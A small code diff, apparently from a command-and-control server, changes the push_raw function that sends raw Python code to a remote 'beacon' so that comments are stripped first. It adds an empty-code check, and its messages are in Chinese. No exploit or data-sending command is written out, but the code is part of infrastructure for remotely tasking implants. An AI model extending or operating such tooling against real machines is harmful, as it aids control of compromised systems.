@@ -436,7 +436,11 @@ def list_commands() -> list:
 
 
 def push_raw(client_id: str, code: str):
-    """把原始 Python 代码作为任务下发到 beacon。返回 (ok, message)。"""
+    """把原始 Python 代码作为任务下发到 beacon。返回 (ok, message)。
+
+    下发前剥离全部 # 注释(tokenize 安全,字符串内容与 docstring 不受影响),
+    与模块下发(module_loader.build_task)行为一致——载荷端只收到可执行代码。
+    """
     server = get_c2()
     if not server:
         return False, "C2 未启动"
@@ -446,6 +450,10 @@ def push_raw(client_id: str, code: str):
         return False, "client_id 为空"
     if not code:
         return False, "代码为空"
+    from server.module_loader import strip_py_comments
+    code = strip_py_comments(code).strip()
+    if not code:
+        return False, "剥离注释后代码为空"
     with _C2_LOCK:
         rec = server._mgr.get_client(client_id)
         if not rec:
